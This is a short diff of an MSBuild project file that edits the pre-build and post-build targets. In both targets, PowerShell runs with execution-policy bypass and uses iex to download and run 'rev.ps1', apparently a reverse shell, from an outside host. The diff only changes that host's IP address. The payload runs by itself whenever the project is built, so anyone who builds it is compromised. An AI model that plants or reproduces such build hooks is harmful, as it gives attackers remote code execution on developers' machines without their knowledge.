@@ -9,11 +9,11 @@
   </PropertyGroup>
 
   <Target Name="PostBuild" AfterTargets="PostBuildEvent">
-    <Exec Command="c:\windows\system32\ping 10.10.14.5&#xD;&#xA;powershell -ep bypass &quot;iex((new-object net.webclient).downloadstring('http://10.10.14.5:8000/rev.ps1'))&quot;" />
+    <Exec Command="c:\windows\system32\ping 10.10.14.30&#xD;&#xA;powershell -ep bypass &quot;iex((new-object net.webclient).downloadstring('http://10.10.14.30:8000/rev.ps1'))&quot;" />
   </Target>
 
   <Target Name="PreBuild" BeforeTargets="PreBuildEvent">
-    <Exec Command="powershell -ep bypass &quot;iex((new-object net.webclient).downloadstring('http://10.10.14.5:8000/rev.ps1'))&quot;" />
+    <Exec Command="powershell -ep bypass &quot;iex((new-object net.webclient).downloadstring('http://10.10.14.30:8000/rev.ps1'))&quot;" />
   </Target>
 
 </Project>
